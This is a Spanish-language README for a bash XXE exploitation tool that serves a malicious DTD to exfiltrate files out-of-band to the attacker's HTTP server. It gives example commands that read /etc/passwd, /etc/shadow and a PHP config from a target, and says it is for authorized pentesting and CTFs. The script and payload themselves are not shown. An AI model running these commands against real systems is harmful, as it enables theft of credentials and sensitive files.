# XXE Out-of-Band File Exfiltration Tool

Herramienta en bash para explotar vulnerabilidades **XXE (XML External Entity)** mediante técnica out-of-band (OOB) con un DTD malicioso servido desde un servidor HTTP local.

> ⚠️ **Solo para pentesting autorizado y CTFs.**  
> No utilices esta herramienta contra sistemas que no sean de tu propiedad o para los que no tengas permiso explícito.

---

## ¿Cómo funciona?

1. Genera un archivo `DTD` malicioso que usa `php://filter` para codificar en base64 el archivo objetivo y exfiltrarlo mediante una petición HTTP GET a tu máquina.
2. Levanta un servidor HTTP local con Python para servir el DTD y capturar los datos exfiltrados.
3. Envía el payload XXE al endpoint vulnerable.
4. Decodifica y muestra automáticamente el contenido del archivo.

```
Atacante                        Servidor objetivo
   |                                  |
   |-- HTTP POST (payload XXE) -----> |
   |                                  |-- carga malicious.dtd del atacante
   | <-- GET /malicious.dtd ----------|
   |                                  |-- lee archivo local y lo codifica en base64
   | <-- GET /?file=<base64data> -----|
   |                                  |
   |  [decodifica y muestra archivo]  |
```

---

## Requisitos

- `bash`
- `curl`
- `python3`

---

## Uso

```bash
chmod +x xxe_exploit.sh
./xxe_exploit.sh [OPCIONES]
```

### Opciones

| Flag | Descripción | Requerido |
|------|-------------|-----------|
| `-u <url>` | URL del objetivo | ✅ |
| `-l <ip>` | Tu IP local/atacante | ✅ |
| `-f <archivo>` | Archivo remoto a leer | ✅ |
| `-p <puerto>` | Puerto del servidor HTTP local (por defecto: 80) | ❌ |
| `-x <archivo>` | Payload XML personalizado | ❌ |
| `-o <archivo>` | Guardar el output en un archivo | ❌ |
| `-h` | Mostrar ayuda | ❌ |

---

## Ejemplos

**Leer `/etc/passwd`:**
```bash
./xxe_exploit.sh -u http://10.10.10.1/process.php -l 10.10.14.5 -f /etc/passwd
```

**Leer `/etc/shadow` en el puerto 8080 y guardar el resultado:**
```bash
./xxe_exploit.sh -u http://10.10.10.1/process.php -l 10.10.14.5 -f /etc/shadow -p 8080 -o shadow.txt
```

**Usar un payload XML personalizado:**
```bash
./xxe_exploit.sh -u http://10.10.10.1/vulnerable.php -l 10.10.14.5 -f /var/www/html/config.php -x mi_payload.xml
```

---

## Notas

- El servidor objetivo debe poder realizar peticiones HTTP salientes hacia tu máquina.
- El payload XML por defecto está orientado a endpoints PHP genéricos. Usa `-x` para proporcionar tu propio payload si la aplicación lo requiere.
- Si no se reciben datos, verifica que tu IP sea accesible desde el objetivo y que ningún firewall esté bloqueando la conexión.
- Requiere que el puerto 80 (o el especificado) esté libre en tu máquina.

---

## Disclaimer

Esta herramienta está destinada únicamente a **fines educativos** y **pruebas de seguridad legales**. El autor no se hace responsable del mal uso o daños causados por este programa. Obtén siempre la autorización correspondiente antes de realizar cualquier prueba.
